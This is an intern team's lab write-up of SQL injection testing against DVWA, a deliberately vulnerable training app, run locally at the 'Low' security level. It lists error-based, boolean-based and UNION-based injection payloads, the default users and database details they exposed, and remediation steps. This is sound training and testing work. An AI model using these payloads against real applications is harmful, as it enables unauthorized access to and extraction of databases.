# 💉 Week 2 — Task 1: SQL Injection Testing

**Intern (Team Lead):** Sruthi Rajeshkumar  

**Team Members:** Abhinaya | MD Abdulla | Sudarshan Yadav  

**Organization:** Zaalimaa Development Pvt Ltd  

**Project:** Project 2 — Web Application Penetration Testing (OWASP Top 10 Focus)  

**Week:** Week 2  

**Date:** 03.06.2026  

**Status:** ✅ Completed

---

## 📌 Objective
Perform SQL Injection testing on DVWA to understand how SQLi vulnerabilities work, extract sensitive data from the database, and document all findings with proof of exploitation.

**OWASP Reference:** A05:2025 - Injection  

**Platform:** DVWA (http://localhost:8080)  

**Security Level:** Low  

**Module:** SQL Injection

---

## 📸 Screenshots

- Screenshot 1: Docker containers running — `screenshots/docker-ps-week2.png`
- Screenshot 2: DVWA Login page — `screenshots/dvwa-login.png`
- Screenshot 3: DVWA Dashboard — `screenshots/dvwa-dashboard-week2.png`
- Screenshot 4: DVWA Security set to Low — `screenshots/dvwa-security-low.png`
- Screenshot 5: SQL Injection module — `screenshots/sqli-module.png`
- Screenshot 6: Normal query result (ID=1) — `screenshots/sqli-normal-result.png`
- Screenshot 7: SQL error message (MariaDB exposed) — `screenshots/sqli-error-message.png`
- Screenshot 8: All users dumped — `screenshots/sqli-all-users-dumped.png`
- Screenshot 9: UNION based - DB info extracted — `screenshots/sqli-union-db-info.png`

---

## 🛠️ Environment Setup

| Field | Details |
|---|---|
| **OS** | Kali Linux (VMware Workstation) |
| **Platform** | DVWA v1.10 |
| **Database** | MariaDB |
| **URL** | http://localhost:8080/vulnerabilities/sqli/ |
| **Security Level** | Low |

---

## 🧪 Testing Process

### Step 1 — Normal Query (Baseline)

Input: 1

Result: ID: 1, First name: admin, Surname: admin

Observation: Normal query returns single user details


### Step 2 — Error Based SQLi

Input: 1' OR '1'='1

Result: SQL syntax error revealed

Observation: Application is vulnerable to SQLi
             Database type exposed: MariaDB


### Step 3 — Boolean Based SQLi

Input: ' OR 1=1#

Result: All 5 users dumped from database

Observation: No input sanitization — full DB dump possible



### Step 4 — UNION Based SQLi

Input: ' OR 1=1 UNION SELECT user(),database()#

Result: Database credentials exposed
        DB User: app@localhost
        DB Name: dvwa

Observation: Critical database information extracted

---

## 🔎 Findings & Results

| # | Test Type | Payload | Result | Severity |
|---|---|---|---|---|
| 1 | Normal Query | 1 | Single user returned | — |
| 2 | Error Based | 1' OR '1'='1 | MariaDB version exposed | 🔴 High |
| 3 | Boolean Based | ' OR 1=1# | All 5 users dumped | 🔴 Critical |
| 4 | Union Based | ' OR 1=1 UNION SELECT user(),database()# | DB user + DB name exposed | 🔴 Critical |

---

## 👥 Users Extracted from Database

| ID | First Name | Surname |
|---|---|---|
| 1 | admin | admin |
| 2 | Gordon | Brown |
| 3 | Hack | Me |
| 4 | Pablo | Picasso |
| 5 | Bob | Smith |

---

## 🗄️ Database Information Extracted

| Field | Value |
|---|---|
| **Database Name** | dvwa |
| **Database User** | app@localhost |
| **Database Type** | MariaDB |

---

## ⚠️ Vulnerabilities Identified

### 1. SQL Injection — Critical 🔴

- **Location:** User ID input field
- **Type:** Error Based, Boolean Based, UNION Based
- **Impact:** Full database compromise, sensitive data exposure
- **Evidence:** All user records extracted, DB credentials exposed

---

## 🛡️ Remediation Recommendations

| # | Recommendation |
|---|---|
| 1 | Use parameterized queries / prepared statements |
| 2 | Validate and sanitize all user inputs |
| 3 | Apply least privilege to database accounts |
| 4 | Use a Web Application Firewall (WAF) |
| 5 | Disable detailed error messages in production |
| 6 | Implement input length restrictions |

---

## ✅ Task Completion Status

| Team Member | Role | Status |
|---|---|---|
| Sruthi Rajeshkumar | Team Lead | ✅ Completed |
| Abhinaya | Member | ✅ Completed |
| MD Abdulla | Member | ✅ Completed |
| Sudarshan Yadav | Member | ✅ Completed |
